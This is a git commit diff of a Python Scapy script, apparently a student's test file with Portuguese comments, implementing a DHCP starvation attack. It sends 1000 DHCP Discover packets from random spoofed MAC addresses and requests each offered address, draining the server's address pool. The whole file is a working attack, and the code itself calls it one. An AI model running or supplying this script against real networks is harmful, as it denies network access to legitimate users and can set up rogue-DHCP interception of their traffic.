ff1e6fb41c31abe228a6eada30d3759068ccd523
João Paulo Gomes Barbosa <joaopaulo_b2008@hotmail.com>
2024-07-14 13:23:22 -0300

    starvation10

--- teste.py
+++ teste.py
@@ -2,58 +2,65 @@ from scapy.all import *
 import time
 
 def dhcp_starvation(interface, num_packets, delay):
-    # Desativar a verificação de endereço IP no Scapy
     conf.checkIPaddr = False
-    
-    # Lista para armazenar os IPs oferecidos
-    offered_ips = []
 
-    # Função para lidar com pacotes DHCP
-    def handle_dhcp(pkt):
-        if DHCP in pkt:
-            if pkt[DHCP].options[0][1] == 2:  # DHCP Offer
-                offered_ips.append(pkt[IP].src)
-                print(f"Received DHCP Offer from {pkt[IP].src}")
-
-    # Fase de Discover
     for _ in range(num_packets):
+        # Gerar um endereço MAC aleatório
         mac_address = RandMAC()
-        dhcp_discover = Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") / \
-                        IP(src="0.0.0.0", dst="255.255.255.255") / \
-                        UDP(sport=68, dport=67) / \
-                        BOOTP(chaddr=mac_address) / \
-                        DHCP(options=[("message-type", "discover"), ("end")])
+        print(f"Sending DHCP Discover with MAC {mac_address}")
 
+        # Construir o pacote DHCP Discover
+        dhcp_discover = (
+            Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") /
+            IP(src="0.0.0.0", dst="255.255.255.255") /
+            UDP(sport=68, dport=67) /
+            BOOTP(chaddr=mac_address) /
+            DHCP(options=[("message-type", "discover"), ("end")])
+        )
+
+        # Enviar o pacote DHCP Discover
         sendp(dhcp_discover, iface=interface, verbose=0)
 
+        # Aguardar um pequeno intervalo entre os pacotes
         time.sleep(delay)
 
-    # Esperar para todas as respostas DHCP Offer
-    time.sleep(2)
+        # Aguardar e capturar a resposta DHCP Offer
+        pkt = sniff(filter="udp and (port 67 or port 68)", count=1, timeout=2, iface=interface)
+        if pkt:
+            if DHCP in pkt[0] and pkt[0][DHCP].options[0][1] == 2:  # DHCP Offer
+                print(f"Received DHCP Offer from {pkt[0][IP].src}")
+                # Construir o pacote DHCP Request
+                dhcp_request = (
+                    Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") /
+                    IP(src="0.0.0.0", dst="255.255.255.255") /
+                    UDP(sport=68, dport=67) /
+                    BOOTP(chaddr=mac_address, xid=pkt[0][BOOTP].xid) /
+                    DHCP(options=[("message-type", "request"),
+                                  ("requested_addr", pkt[0][BOOTP].yiaddr),
+                                  ("server_id", pkt[0][IP].src),
+                                  ("end")])
+                )
+                # Enviar o pacote DHCP Request
+                sendp(dhcp_request, iface=interface, verbose=0)
 
-    # Fase de Request e ACK
-    for ip in offered_ips:
-        mac_address = RandMAC()
-        dhcp_request = Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") / \
-                       IP(src="0.0.0.0", dst="255.255.255.255") / \
-                       UDP(sport=68, dport=67) / \
-                       BOOTP(chaddr=mac_address) / \
-                       DHCP(options=[("message-type", "request"),
-                                     ("requested_addr", ip),
-                                     ("end")])
-
-        sendp(dhcp_request, iface=interface, verbose=0)
-        print(f"Sent DHCP Request for {ip}")
-
-        time.sleep(delay)
-
-        # Aguardar resposta DHCP ACK
-        sniff(filter=f"udp and (port 67 or port 68) and host {ip}", prn=handle_dhcp, timeout=5, iface=interface)
+                # Aguardar e capturar a resposta DHCP Acknowledge
+                pkt = sniff(filter="udp and (port 67 or port 68)", count=1, timeout=2, iface=interface)
+                if pkt:
+                    if DHCP in pkt[0] and pkt[0][DHCP].options[0][1] == 5:  # DHCP Acknowledge
+                        print(f"Received DHCP Acknowledge from {pkt[0][IP].src}")
+                    else:
+                        print("No DHCP Acknowledge received.")
+                else:
+                    print("No DHCP response received for Request.")
+            else:
+                print("No DHCP Offer received.")
+        else:
+            print("No DHCP response received for Discover.")
 
 if __name__ == "__main__":
     interface = "eth0"   # Interface de rede a ser usada para o ataque
-    num_packets = 10     # Número de pacotes DHCP Discover a serem enviados
-    delay = 0.5          # Atraso entre o envio de cada pacote em segundos
+    num_packets = 1000   # Número de pacotes a serem enviados
+    delay = 0.1          # Atraso entre pacotes em segundos
 
     dhcp_starvation(interface, num_packets, delay)
 
